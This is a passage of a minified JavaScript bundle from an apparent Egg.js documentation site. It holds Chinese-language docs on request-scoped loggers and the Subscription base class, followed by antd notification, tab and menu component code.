\u6253\u5370\u65e5\u5fd7\uff0c\u800c\u6846\u67b6\u548c\u63d2\u4ef6\u5219\u9700\u8981\u901a\u8fc7\u5b83\u6765\u6253\u5370\u5e94\u7528\u7ea7\u522b\u7684\u65e5\u5fd7\uff0c\u8fd9\u6837\u53ef\u4ee5\u66f4\u6e05\u6670\u7684\u533a\u5206\u5e94\u7528\u548c\u6846\u67b6\u6253\u5370\u7684\u65e5\u5fd7\uff0c\u901a\u8fc7 CoreLogger \u6253\u5370\u7684\u65e5\u5fd7\u4f1a\u653e\u5230\u548c Logger \u4e0d\u540c\u7684\u6587\u4ef6\u4e2d\u3002"),r.a.createElement("h3",{id:"context-logger"},r.a.createElement(l["AnchorLink"],{to:"#context-logger","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Context Logger"),r.a.createElement("p",null,"\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement("code",null,"ctx.logger")," \u4ece Context \u5b9e\u4f8b\u4e0a\u83b7\u53d6\u5230\u5b83\uff0c\u4ece\u8bbf\u95ee\u65b9\u5f0f\u4e0a\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u6765\uff0cContext Logger \u4e00\u5b9a\u662f\u4e0e\u8bf7\u6c42\u76f8\u5173\u7684\uff0c\u5b83\u6253\u5370\u7684\u65e5\u5fd7\u90fd\u4f1a\u5728\u524d\u9762\u5e26\u4e0a\u4e00\u4e9b\u5f53\u524d\u8bf7\u6c42\u76f8\u5173\u7684\u4fe1\u606f\uff08\u5982 ",r.a.createElement("code",null,"[$userId/$ip/$traceId/$","{","cost","}","ms $method $url]"),"\uff09\uff0c\u901a\u8fc7\u8fd9\u4e9b\u4fe1\u606f\uff0c\u6211\u4eec\u53ef\u4ee5\u4ece\u65e5\u5fd7\u5feb\u901f\u5b9a\u4f4d\u8bf7\u6c42\uff0c\u5e76\u4e32\u8054\u4e00\u6b21\u8bf7\u6c42\u4e2d\u7684\u6240\u6709\u7684\u65e5\u5fd7\u3002"),r.a.createElement("h3",{id:"context-corelogger"},r.a.createElement(l["AnchorLink"],{to:"#context-corelogger","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Context CoreLogger"),r.a.createElement("p",null,"\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement("code",null,"ctx.coreLogger")," \u83b7\u53d6\u5230\u5b83\uff0c\u548c Context Logger \u7684\u533a\u522b\u662f\u4e00\u822c\u53ea\u6709\u63d2\u4ef6\u548c\u6846\u67b6\u4f1a\u901a\u8fc7\u5b83\u6765\u8bb0\u5f55\u65e5\u5fd7\u3002"),r.a.createElement("h3",{id:"controller-logger--service-logger"},r.a.createElement(l["AnchorLink"],{to:"#controller-logger--service-logger","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Controller Logger & Service Logger"),r.a.createElement("p",null,"\u6211\u4eec\u53ef\u4ee5\u5728 Controller \u548c Service \u5b9e\u4f8b\u4e0a\u901a\u8fc7 ",r.a.createElement("code",null,"this.logger")," \u83b7\u53d6\u5230\u5b83\u4eec\uff0c\u5b83\u4eec\u672c\u8d28\u4e0a\u5c31\u662f\u4e00\u4e2a Context Logger\uff0c\u4e0d\u8fc7\u5728\u6253\u5370\u65e5\u5fd7\u7684\u65f6\u5019\u8fd8\u4f1a\u989d\u5916\u7684\u52a0\u4e0a\u6587\u4ef6\u8def\u5f84\uff0c\u65b9\u4fbf\u5b9a\u4f4d\u65e5\u5fd7\u7684\u6253\u5370\u4f4d\u7f6e\u3002"),r.a.createElement("h2",{id:"subscription"},r.a.createElement(l["AnchorLink"],{to:"#subscription","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Subscription"),r.a.createElement("p",null,"\u8ba2\u9605\u6a21\u578b\u662f\u4e00\u79cd\u6bd4\u8f83\u5e38\u89c1\u7684\u5f00\u53d1\u6a21\u5f0f\uff0c\u8b6c\u5982\u6d88\u606f\u4e2d\u95f4\u4ef6\u7684\u6d88\u8d39\u8005\u6216\u8c03\u5ea6\u4efb\u52a1\u3002\u56e0\u6b64\u6211\u4eec\u63d0\u4f9b\u4e86 Subscription \u57fa\u7c7b\u6765\u89c4\u8303\u5316\u8fd9\u4e2a\u6a21\u5f0f\u3002"),r.a.createElement("p",null,"\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u65b9\u5f0f\u6765\u5f15\u7528 Subscription \u57fa\u7c7b\uff1a"),r.a.createElement(o["a"],{code:"const Subscription = require('egg').Subscription;\n\nclass Schedule extends Subscription {\n  // \u9700\u8981\u5b9e\u73b0\u6b64\u65b9\u6cd5\n  // subscribe \u53ef\u4ee5\u4e3a async function \u6216 generator function\n  async subscribe() {}\n}",lang:"js"}),r.a.createElement("p",null,"\u63d2\u4ef6\u5f00\u53d1\u8005\u53ef\u4ee5\u6839\u636e\u81ea\u5df1\u7684\u9700\u6c42\u57fa\u4e8e\u5b83\u5b9a\u5236\u8ba2\u9605\u89c4\u8303\uff0c\u5982",r.a.createElement(l["Link"],{to:"./schedule"},"\u5b9a\u65f6\u4efb\u52a1"),"\u5c31\u662f\u4f7f\u7528\u8fd9\u79cd\u89c4\u8303\u5b9e\u73b0\u7684\u3002")))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},"7Vsj":function(e,t,n){var a=n("tS9j"),r=n("4avo"),l="["+r+"]",o=RegExp("^"+l+l+"*"),i=RegExp(l+l+"*$"),c=function(e){return function(t){var n=String(a(t));return 1&e&&(n=n.replace(o,"")),2&e&&(n=n.replace(i,"")),n}};e.exports={start:c(1),end:c(2),trim:c(3)}},"7cRc":function(e,t,n){"use strict";Object.defineProperty(t,"__esModule",{value:!0}),t.getParameters=void 0;var a=n("Flpl");function r(e){return a.compressToBase64(e).replace(/\+/g,"-").replace(/\//g,"_").replace(/=+$/,"")}function l(e){return r(JSON.stringify(e))}t.getParameters=l},"7gyq":function(e,t,n){"use strict";n("ojUw");var a=n("2EJr"),r=n("qPib"),l=n("3Qq0"),o=n("FU0I"),i={icon:{tag:"svg",attrs:{viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M699 353h-46.9c-10.2 0-19.9 4.9-25.9 13.3L469 584.3l-71.2-98.8c-6-8.3-15.6-13.3-25.9-13.3H325c-6.5 0-10.3 7.4-6.5 12.7l124.6 172.8a31.8 31.8 0 0051.7 0l210.6-292c3.9-5.3.1-12.7-6.4-12.7z"}},{tag:"path",attrs:{d:"M512 64C264.6 64 64 264.6 64 512s200.6 448 448 448 448-200.6 448-448S759.4 64 512 64zm0 820c-205.4 0-372-166.6-372-372s166.6-372 372-372 372 166.6 372 372-166.6 372-372 372z"}}]},name:"check-circle",theme:"outlined"},c=i,s=n("Il1s"),u=function(e,t){return o["createElement"](s["a"],Object(l["a"])(Object(l["a"])({},e),{},{ref:t,icon:c}))};u.displayName="CheckCircleOutlined";var d=o["forwardRef"](u),m={icon:{tag:"svg",attrs:{viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M685.4 354.8c0-4.4-3.6-8-8-8l-66 .3L512 465.6l-99.3-118.4-66.1-.3c-4.4 0-8 3.5-8 8 0 1.9.7 3.7 1.9 5.2l130.1 155L340.5 670a8.32 8.32 0 00-1.9 5.2c0 4.4 3.6 8 8 8l66.1-.3L512 564.4l99.3 118.4 66 .3c4.4 0 8-3.5 8-8 0-1.9-.7-3.7-1.9-5.2L553.5 515l130.1-155c1.2-1.4 1.8-3.3 1.8-5.2z"}},{tag:"path",attrs:{d:"M512 65C264.6 65 64 265.6 64 513s200.6 448 448 448 448-200.6 448-448S759.4 65 512 65zm0 820c-205.4 0-372-166.6-372-372s166.6-372 372-372 372 166.6 372 372-166.6 372-372 372z"}}]},name:"close-circle",theme:"outlined"},p=m,h=function(e,t){return o["createElement"](s["a"],Object(l["a"])(Object(l["a"])({},e),{},{ref:t,icon:p}))};h.displayName="CloseCircleOutlined";var g=o["forwardRef"](h),f=n("55D7"),E={icon:{tag:"svg",attrs:{viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M512 64C264.6 64 64 264.6 64 512s200.6 448 448 448 448-200.6 448-448S759.4 64 512 64zm0 820c-205.4 0-372-166.6-372-372s166.6-372 372-372 372 166.6 372 372-166.6 372-372 372z"}},{tag:"path",attrs:{d:"M464 688a48 48 0 1096 0 48 48 0 10-96 0zm24-112h48c4.4 0 8-3.6 8-8V296c0-4.4-3.6-8-8-8h-48c-4.4 0-8 3.6-8 8v272c0 4.4 3.6 8 8 8z"}}]},name:"exclamation-circle",theme:"outlined"},b=E,v=function(e,t){return o["createElement"](s["a"],Object(l["a"])(Object(l["a"])({},e),{},{ref:t,icon:b}))};v.displayName="ExclamationCircleOutlined";var y=o["forwardRef"](v),k={icon:{tag:"svg",attrs:{viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M512 64C264.6 64 64 264.6 64 512s200.6 448 448 448 448-200.6 448-448S759.4 64 512 64zm0 820c-205.4 0-372-166.6-372-372s166.6-372 372-372 372 166.6 372 372-166.6 372-372 372z"}},{tag:"path",attrs:{d:"M464 336a48 48 0 1096 0 48 48 0 10-96 0zm72 112h-48c-4.4 0-8 3.6-8 8v272c0 4.4 3.6 8 8 8h48c4.4 0 8-3.6 8-8V456c0-4.4-3.6-8-8-8z"}}]},name:"info-circle",theme:"outlined"},w=k,x=function(e,t){return o["createElement"](s["a"],Object(l["a"])(Object(l["a"])({},e),{},{ref:t,icon:w}))};x.displayName="InfoCircleOutlined";var j=o["forwardRef"](x),S=n("VGn1"),C=n.n(S),A=n("n0SI"),L=n("sAEC"),T=n("0YMn"),N=n("bymz"),O=n("2HmL");function I(e,t){var n=function(){var n,r=null,l={add:function(e,t){null===r||void 0===r||r.component.add(e,t)}},i=Object(N["a"])(l),c=Object(T["a"])(i,2),s=c[0],u=c[1];function d(l){var o=l.prefixCls,i=n("notification",o);e(Object(a["a"])(Object(a["a"])({},l),{prefixCls:i}),(function(e){var n=e.prefixCls,a=e.instance;r=a,s(t(l,n))}))}var m=o["useRef"]({});return m.current.open=d,["success","info","warning","error"].forEach((function(e){m.current[e]=function(t){return m.current.open(Object(a["a"])(Object(a["a"])({},t),{type:e}))}})),[m.current,o["createElement"](O["a"],{key:"holder"},(function(e){return n=e.getPrefixCls,u}))]};return n}var P,R,_,q={},M=4.5,F=24,D=24,U="",z="topRight",H=!1;function B(e){var t=e.duration,n=e.placement,a=e.bottom,r=e.top,l=e.getContainer,o=e.closeIcon,i=e.prefixCls;void 0!==i&&(U=i),void 0!==t&&(M=t),void 0!==n?z=n:e.rtl&&(z="topLeft"),void 0!==a&&(D=a),void 0!==r&&(F=r),void 0!==l&&(P=l),void 0!==o&&(R=o),void 0!==e.rtl&&(H=e.rtl),void 0!==e.maxCount&&(_=e.maxCount)}function W(e){var t,n=arguments.length>1&&void 0!==arguments[1]?arguments[1]:F,a=arguments.length>2&&void 0!==arguments[2]?arguments[2]:D;switch(e){case"top":t={left:"50%",transform:"translateX(-50%)",right:"auto",top:n,bottom:"auto"};break;case"topLeft":t={left:0,top:n,bottom:"auto"};break;case"topRight":t={right:0,top:n,bottom:"auto"};break;case"bottom":t={left:"50%",transform:"translateX(-50%)",right:"auto",top:"auto",bottom:a};break;case"bottomLeft":t={left:0,top:"auto",bottom:a};break;default:t={right:0,top:"auto",bottom:a};break}return t}function V(e,t){var n=e.placement,a=void 0===n?z:n,l=e.top,o=e.bottom,i=e.getContainer,c=void 0===i?P:i,s=e.prefixCls,u=Object(L["b"])(),d=u.getPrefixCls,m=u.getIconPrefixCls,p=d("notification",s||U),h=m(),g="".concat(p,"-").concat(a),f=q[g];if(f)Promise.resolve(f).then((function(e){t({prefixCls:"".concat(p,"-notice"),iconPrefixCls:h,instance:e})}));else{var E=C()("".concat(p,"-").concat(a),Object(r["a"])({},"".concat(p,"-rtl"),!0===H));q[g]=new Promise((function(e){A["a"].newInstance({prefixCls:p,className:E,style:W(a,l,o),getContainer:c,maxCount:_},(function(n){e(n),t({prefixCls:"".concat(p,"-notice"),iconPrefixCls:h,instance:n})}))}))}}var $={success:d,info:j,error:g,warning:y};function G(e,t,n){var a=e.duration,l=e.icon,i=e.type,c=e.description,s=e.message,u=e.btn,d=e.onClose,m=e.onClick,p=e.key,h=e.style,g=e.className,E=e.closeIcon,b=void 0===E?R:E,v=e.props,y=void 0===a?M:a,k=null;l?k=o["createElement"]("span",{className:"".concat(t,"-icon")},e.icon):i&&(k=o["createElement"]($[i]||null,{className:"".concat(t,"-icon ").concat(t,"-icon-").concat(i)}));var w=o["createElement"]("span",{className:"".concat(t,"-close-x")},b||o["createElement"](f["a"],{className:"".concat(t,"-close-icon")})),x=!c&&k?o["createElement"]("span",{className:"".concat(t,"-message-single-line-auto-margin")}):null;return{content:o["createElement"](L["a"],{iconPrefixCls:n},o["createElement"]("div",{className:k?"".concat(t,"-with-icon"):"",role:"alert"},k,o["createElement"]("div",{className:"".concat(t,"-message")},x,s),o["createElement"]("div",{className:"".concat(t,"-description")},c),u?o["createElement"]("span",{className:"".concat(t,"-btn")},u):null)),duration:y,closable:!0,closeIcon:w,onClose:d,onClick:m,key:p,style:h||{},className:C()(g,Object(r["a"])({},"".concat(t,"-").concat(i),!!i)),props:v}}function X(e){V(e,(function(t){var n=t.prefixCls,a=t.iconPrefixCls,r=t.instance;r.notice(G(e,n,a))}))}var Q={open:X,close:function(e){Object.keys(q).forEach((function(t){return Promise.resolve(q[t]).then((function(t){t.removeNotice(e)}))}))},config:B,destroy:function(){Object.keys(q).forEach((function(e){Promise.resolve(q[e]).then((function(e){e.destroy()})),delete q[e]}))}};["success","info","warning","error"].forEach((function(e){Q[e]=function(t){return Q.open(Object(a["a"])(Object(a["a"])({},t),{type:e}))}})),Q.warn=Q.warning,Q.useNotification=I(V,G);t["a"]=Q},"7ikL":function(e,t,n){"use strict";var a=n("0mt+"),r=n("m4/z"),l=n("XccI");a({target:"WeakSet",proto:!0,real:!0,forced:r},{deleteAll:function(){return l.apply(this,arguments)}})},"7luJ":function(e,t,n){"use strict";function a(){return a=Object.assign?Object.assign.bind():function(e){for(var t=1;t<arguments.length;t++){var n=arguments[t];for(var a in n)Object.prototype.hasOwnProperty.call(n,a)&&(e[a]=n[a])}return e},a.apply(this,arguments)}n.r(t);var r=n("FU0I"),l=n.n(r),o=n("t08b"),i={},c=n("kVJ2"),s=n("meFy"),u=n.n(s);t["default"]=e=>l.a.createElement(u.a,a({},e,{config:o,demos:i,apis:c}))},"7un0":function(e,t,n){var a=n("Bscc"),r=n("NXx9"),l=n("jAHp"),o=l("metadata"),i=o.store||(o.store=new r),c=function(e,t,n){var r=i.get(e);if(!r){if(!n)return;i.set(e,r=new a)}var l=r.get(t);if(!l){if(!n)return;r.set(t,l=new a)}return l},s=function(e,t,n){var a=c(t,n,!1);return void 0!==a&&a.has(e)},u=function(e,t,n){var a=c(t,n,!1);return void 0===a?void 0:a.get(e)},d=function(e,t,n,a){c(n,a,!0).set(e,t)},m=function(e,t){var n=c(e,t,!1),a=[];return n&&n.forEach((function(e,t){a.push(t)})),a},p=function(e){return void 0===e||"symbol"==typeof e?e:String(e)};e.exports={store:i,getMap:c,has:s,get:u,set:d,keys:m,toKey:p}},"8+XA":function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("2EJr"),o=n("qPib"),i=n("0YMn"),c=n("nzxN"),s=n("EJBU"),u=n("3Qq0"),d=n("VGn1"),m=n.n(d),p=n("ciTX"),h=n("f82q"),g=n("ezrb"),f=n("VGJu"),E=n("WeeI"),b=n("0kLB");function v(e){var t=Object(a["useRef"])(),n=Object(a["useRef"])(!1);function r(){for(var a=arguments.length,r=new Array(a),l=0;l<a;l++)r[l]=arguments[l];n.current||(E["a"].cancel(t.current),t.current=Object(E["a"])((function(){e.apply(void 0,r)})))}return Object(a["useEffect"])((function(){return n.current=!1,function(){n.current=!0,E["a"].cancel(t.current)}}),[]),r}function y(e){var t=Object(a["useRef"])([]),n=Object(a["useState"])({}),r=Object(i["a"])(n,2),l=r[1],o=Object(a["useRef"])("function"===typeof e?e():e),c=v((function(){var e=o.current;t.current.forEach((function(t){e=t(e)})),t.current=[],o.current=e,l({})}));function s(e){t.current.push(e),c()}return[o.current,s]}var k=n("4Sss");function w(e,t){var n,r=e.prefixCls,l=e.id,i=e.active,c=e.tab,s=c.key,u=c.tab,d=c.disabled,p=c.closeIcon,h=e.closable,g=e.renderWrapper,f=e.removeAriaLabel,E=e.editable,b=e.onClick,v=e.onRemove,y=e.onFocus,w=e.style,x="".concat(r,"-tab");a["useEffect"]((function(){return v}),[]);var j=E&&!1!==h&&!d;function S(e){d||b(e)}function C(e){e.preventDefault(),e.stopPropagation(),E.onEdit("remove",{key:s,event:e})}var A=a["createElement"]("div",{key:s,ref:t,className:m()(x,(n={},Object(o["a"])(n,"".concat(x,"-with-remove"),j),Object(o["a"])(n,"".concat(x,"-active"),i),Object(o["a"])(n,"".concat(x,"-disabled"),d),n)),style:w,onClick:S},a["createElement"]("div",{role:"tab","aria-selected":i,id:l&&"".concat(l,"-tab-").concat(s),className:"".concat(x,"-btn"),"aria-controls":l&&"".concat(l,"-panel-").concat(s),"aria-disabled":d,tabIndex:d?null:0,onClick:function(e){e.stopPropagation(),S(e)},onKeyDown:function(e){[k["a"].SPACE,k["a"].ENTER].includes(e.which)&&(e.preventDefault(),S(e))},onFocus:y},u),j&&a["createElement"]("button",{type:"button","aria-label":f||"remove",tabIndex:0,className:"".concat(x,"-remove"),onClick:function(e){e.stopPropagation(),C(e)}},p||E.removeIcon||"\xd7"));return g?g(A):A}var x=a["forwardRef"](w),j={width:0,height:0,left:0,top:0};function S(e,t,n){return Object(a["useMemo"])((function(){for(var n,a=new Map,r=t.get(null===(n=e[0])||void 0===n?void 0:n.key)||j,l=r.left+r.width,o=0;o<e.length;o+=1){var i,c=e[o].key,s=t.get(c);if(!s)s=t.get(null===(i=e[o-1])||void 0===i?void 0:i.key)||j;var d=a.get(c)||Object(u["a"])({},s);d.right=l-d.left-d.width,a.set(c,d)}return a}),[e.map((function(e){return e.key})).join("_"),t,n])}var C={width:0,height:0,left:0,top:0,right:0};function A(e,t,n,r,l){var o,i,c,s=l.tabs,u=l.tabPosition,d=l.rtl;["top","bottom"].includes(u)?(o="width",i=d?"right":"left",c=Math.abs(t.left)):(o="height",i="top",c=-t.top);var m=t[o],p=n[o],h=r[o],g=m;return p+h>m&&p<m&&(g=m-h),Object(a["useMemo"])((function(){if(!s.length)return[0,0];for(var t=s.length,n=t,a=0;a<t;a+=1){var r=e.get(s[a].key)||C;if(r[i]+r[o]>c+g){n=a-1;break}}for(var l=0,u=t-1;u>=0;u-=1){var d=e.get(s[u].key)||C;if(d[i]<c){l=u+1;break}}return[l,n]}),[e,c,g,u,s.map((function(e){return e.key})).join("_"),d])}var L=n("1HCi"),T=n.n(L),N=n("ZbH0"),O=n("Y6X2"),I=n("E3E7"),P=n("+g4N"),R=n("zraO"),_=n("+ujd"),q=n("5svC"),M=n("E5p8"),F=["children","locked"],D=a["createContext"](null);function U(e,t){var n=Object(u["a"])({},e);return Object.keys(t).forEach((function(e){var a=t[e];void 0!==a&&(n[e]=a)})),n}function z(e){var t=e.children,n=e.locked,r=Object(s["a"])(e,F),l=a["useContext"](D),o=Object(M["a"])((function(){return U(l,r)}),[l,r],(function(e,t){return!n&&(e[0]!==t[0]||!T()(e[1],t[1]))}));return a["createElement"](D.Provider,{value:o},t)}function H(e,t,n,r){var l=a["useContext"](D),o=l.activeKey,i=l.onActive,c=l.onInactive,s={active:o===e};return t||(s.onMouseEnter=function(t){null===n||void 0===n||n({key:e,domEvent:t}),i(e)},s.onMouseLeave=function(t){null===r||void 0===r||r({key:e,domEvent:t}),c(e)}),s}var B=["item"];function W(e){var t=e.item,n=Object(s["a"])(e,B);return Object.defineProperty(n,"item",{get:function(){return Object(N["a"])(!1,"`info.item` is deprecated since we will move to function component that not provides React Node instance in future."),t}}),n}function V(e){var t,n=e.icon,r=e.props,l=e.children;return t="function"===typeof n?a["createElement"](n,Object(u["a"])({},r)):n,t||l||null}function $(e){var t=a["useContext"](D),n=t.mode,r=t.rtl,l=t.inlineIndent;if("inline"!==n)return null;var o=e;return r?{paddingRight:o*l}:{paddingLeft:o*l}}var G=[],X=a["createContext"](null);function Q(){return a["useContext"](X)}var K=a["createContext"](G);function J(e){var t=a["useContext"](K);return a["useMemo"]((function(){return void 0!==e?[].concat(Object(f["a"])(t),[e]):t}),[t,e])}var Y=a["createContext"](null),Z=a["createContext"](null);function ee(e,t){return void 0===e?null:"".concat(e,"-").concat(t)}function te(e){var t=a["useContext"](Z);return ee(t,e)}var ne=a["createContext"]({}),ae=ne,re=["title","attribute","elementRef"],le=["style","className","eventKey","warnKey","disabled","itemIcon","children","role","onMouseEnter","onMouseLeave","onClick","onKeyDown","onFocus"],oe=["active"],ie=function(e){Object(R["a"])(n,e);var t=Object(_["a"])(n);function n(){return Object(I["a"])(this,n),t.apply(this,arguments)}return Object(P["a"])(n,[{key:"render",value:function(){var e=this.props,t=e.title,n=e.attribute,r=e.elementRef,o=Object(s["a"])(e,re),i=Object(q["a"])(o,["eventKey"]);return Object(N["a"])(!n,"`attribute` of Menu.Item is deprecated. Please pass attribute directly."),a["createElement"](O["a"].Item,Object(l["a"])({},n,{title:"string"===typeof t?t:void 0},i,{ref:r}))}}]),n}(a["Component"]),ce=function(e){var t,n=e.style,r=e.className,i=e.eventKey,c=(e.warnKey,e.disabled),d=e.itemIcon,p=e.children,h=e.role,g=e.onMouseEnter,E=e.onMouseLeave,b=e.onClick,v=e.onKeyDown,y=e.onFocus,w=Object(s["a"])(e,le),x=te(i),j=a["useContext"](D),S=j.prefixCls,C=j.onItemClick,A=j.disabled,L=j.overflowDisabled,T=j.itemIcon,N=j.selectedKeys,O=j.onActive,I=a["useContext"](ae),P=I._internalRenderMenuItem,R="".concat(S,"-item"),_=a["useRef"](),q=a["useRef"](),M=A||c,F=J(i);var U=function(e){return{key:i,keyPath:Object(f["a"])(F).reverse(),item:_.current,domEvent:e}},z=d||T,B=H(i,M,g,E),G=B.active,X=Object(s["a"])(B,oe),Q=N.includes(i),K=$(F.length),Y=function(e){if(!M){var t=U(e);null===b||void 0===b||b(W(t)),C(t)}},Z=function(e){if(null===v||void 0===v||v(e),e.which===k["a"].ENTER){var t=U(e);null===b||void 0===b||b(W(t)),C(t)}},ee=function(e){O(i),null===y||void 0===y||y(e)},ne={};"option"===e.role&&(ne["aria-selected"]=Q);var re=a["createElement"](ie,Object(l["a"])({ref:_,elementRef:q,role:null===h?"none":h||"menuitem",tabIndex:c?null:-1,"data-menu-id":L&&x?null:x},w,X,ne,{component:"li","aria-disabled":c,style:Object(u["a"])(Object(u["a"])({},K),n),className:m()(R,(t={},Object(o["a"])(t,"".concat(R,"-active"),G),Object(o["a"])(t,"".concat(R,"-selected"),Q),Object(o["a"])(t,"".concat(R,"-disabled"),M),t),r),onClick:Y,onKeyDown:Z,onFocus:ee}),p,a["createElement"](V,{props:Object(u["a"])(Object(u["a"])({},e),{},{isSelected:Q}),icon:z}));return P&&(re=P(re,e,{selected:Q})),re};function se(e){var t=e.eventKey,n=Q(),r=J(t);return a["useEffect"]((function(){if(n)return n.registerPath(t,r),function(){n.unregisterPath(t,r)}}),[r]),n?null:a["createElement"](ce,e)}var ue=se,de=["label","children","key","type"];function me(e,t){return Object(p["a"])(e).map((function(e,n){if(a["isValidElement"](e)){var r,l,o=e.key,i=null!==(r=null===(l=e.props)||void 0===l?void 0:l.eventKey)&&void 0!==r?r:o,c=null===i||void 0===i;c&&(i="tmp_key-".concat([].concat(Object(f["a"])(t),[n]).join("-")));var s={key:i,eventKey:i};return a["cloneElement"](e,s)}return e}))}function pe(e){return(e||[]).map((function(e,t){if(e&&"object"===Object(c["a"])(e)){var n=e.label,r=e.children,o=e.key,i=e.type,u=Object(s["a"])(e,de),d=null!==o&&void 0!==o?o:"tmp-".concat(t);return r||"group"===i?"group"===i?a["createElement"](dt,Object(l["a"])({key:d},u,{title:n}),pe(r)):a["createElement"](Ie,Object(l["a"])({key:d},u,{title:n}),pe(r)):"divider"===i?a["createElement"](mt,Object(l["a"])({key:d},u)):a["createElement"](ue,Object(l["a"])({key:d},u),n)}return null})).filter((function(e){return e}))}function he(e,t,n){var a=e;return t&&(a=pe(t)),me(a,n)}function ge(e){var t=a["useRef"](e);t.current=e;var n=a["useCallback"]((function(){for(var e,n=arguments.length,a=new Array(n),r=0;r<n;r++)a[r]=arguments[r];return null===(e=t.current)||void 0===e?void 0:e.call.apply(e,[t].concat(a))}),[]);return e?n:void 0}var fe=["className","children"],Ee=function(e,t){var n=e.className,r=e.children,o=Object(s["a"])(e,fe),i=a["useContext"](D),c=i.prefixCls,u=i.mode,d=i.rtl;return a["createElement"]("ul",Object(l["a"])({className:m()(c,d&&"".concat(c,"-rtl"),"".concat(c,"-sub"),"".concat(c,"-").concat("inline"===u?"inline":"vertical"),n)},o,{"data-menu-list":!0,ref:t}),r)},be=a["forwardRef"](Ee);be.displayName="SubMenuList";var ve=be,ye=n("y+Tp"),ke={adjustX:1,adjustY:1},we={topLeft:{points:["bl","tl"],overflow:ke,offset:[0,-7]},bottomLeft:{points:["tl","bl"],overflow:ke,offset:[0,7]},leftTop:{points:["tr","tl"],overflow:ke,offset:[-4,0]},rightTop:{points:["tl","tr"],overflow:ke,offset:[4,0]}},xe={topLeft:{points:["bl","tl"],overflow:ke,offset:[0,-7]},bottomLeft:{points:["tl","bl"],overflow:ke,offset:[0,7]},rightTop:{points:["tr","tl"],overflow:ke,offset:[-4,0]},leftTop:{points:["tl","tr"],overflow:ke,offset:[4,0]}};function je(e,t,n){return t||(n?n[e]||n.other:void 0)}var Se={horizontal:"bottomLeft",vertical:"rightTop","vertical-left":"rightTop","vertical-right":"leftTop"};function Ce(e){var t=e.prefixCls,n=e.visible,r=e.children,l=e.popup,c=e.popupClassName,s=e.popupOffset,d=e.disabled,p=e.mode,h=e.onVisibleChange,g=a["useContext"](D),f=g.getPopupContainer,b=g.rtl,v=g.subMenuOpenDelay,y=g.subMenuCloseDelay,k=g.builtinPlacements,w=g.triggerSubMenuAction,x=g.forceSubMenuRender,j=g.rootClassName,S=g.motion,C=g.defaultMotions,A=a["useState"](!1),L=Object(i["a"])(A,2),T=L[0],N=L[1],O=b?Object(u["a"])(Object(u["a"])({},xe),k):Object(u["a"])(Object(u["a"])({},we),k),I=Se[p],P=je(p,S,C),R=Object(u["a"])(Object(u["a"])({},P),{},{leavedClassName:"".concat(t,"-hidden"),removeOnLeave:!1,motionAppear:!0}),_=a["useRef"]();return a["useEffect"]((function(){return _.current=Object(E["a"])((function(){N(n)})),function(){E["a"].cancel(_.current)}}),[n]),a["createElement"](ye["a"],{prefixCls:t,popupClassName:m()("".concat(t,"-popup"),Object(o["a"])({},"".concat(t,"-rtl"),b),c,j),stretch:"horizontal"===p?"minWidth":null,getPopupContainer:f,builtinPlacements:O,popupPlacement:I,popupVisible:T,popup:l,popupAlign:s&&{offset:s},action:d?[]:[w],mouseEnterDelay:v,mouseLeaveDelay:y,onPopupVisibleChange:h,forceRender:x,popupMotion:R},r)}var Ae=n("64/3");function Le(e){var t=e.id,n=e.open,r=e.keyPath,o=e.children,c="inline",s=a["useContext"](D),d=s.prefixCls,m=s.forceSubMenuRender,p=s.motion,h=s.defaultMotions,g=s.mode,f=a["useRef"](!1);f.current=g===c;var E=a["useState"](!f.current),b=Object(i["a"])(E,2),v=b[0],y=b[1],k=!!f.current&&n;a["useEffect"]((function(){f.current&&y(!1)}),[g]);var w=Object(u["a"])({},je(c,p,h));r.length>1&&(w.motionAppear=!1);var x=w.onVisibleChanged;return w.onVisibleChanged=function(e){return f.current||e||y(!0),null===x||void 0===x?void 0:x(e)},v?null:a["createElement"](z,{mode:c,locked:!f.current},a["createElement"](Ae["b"],Object(l["a"])({visible:k},w,{forceRender:m,removeOnLeave:!1,leavedClassName:"".concat(d,"-hidden")}),(function(e){var n=e.className,r=e.style;return a["createElement"](ve,{id:t,className:n,style:r},o)})))}var Te=["style","className","title","eventKey","warnKey","disabled","internalPopupClose","children","itemIcon","expandIcon","popupClassName","popupOffset","onClick","onMouseEnter","onMouseLeave","onTitleClick","onTitleMouseEnter","onTitleMouseLeave"],Ne=["active"],Oe=function(e){var t,n=e.style,r=e.className,c=e.title,d=e.eventKey,p=(e.warnKey,e.disabled),h=e.internalPopupClose,g=e.children,f=e.itemIcon,E=e.expandIcon,b=e.popupClassName,v=e.popupOffset,y=e.onClick,k=e.onMouseEnter,w=e.onMouseLeave,x=e.onTitleClick,j=e.onTitleMouseEnter,S=e.onTitleMouseLeave,C=Object(s["a"])(e,Te),A=te(d),L=a["useContext"](D),T=L.prefixCls,N=L.mode,I=L.openKeys,P=L.disabled,R=L.overflowDisabled,_=L.activeKey,q=L.selectedKeys,M=L.itemIcon,F=L.expandIcon,U=L.onItemClick,B=L.onOpenChange,G=L.onActive,X=a["useContext"](ae),Q=X._internalRenderSubMenuItem,K=a["useContext"](Y),Z=K.isSubPathKey,ee=J(),ne="".concat(T,"-submenu"),re=P||p,le=a["useRef"](),oe=a["useRef"]();var 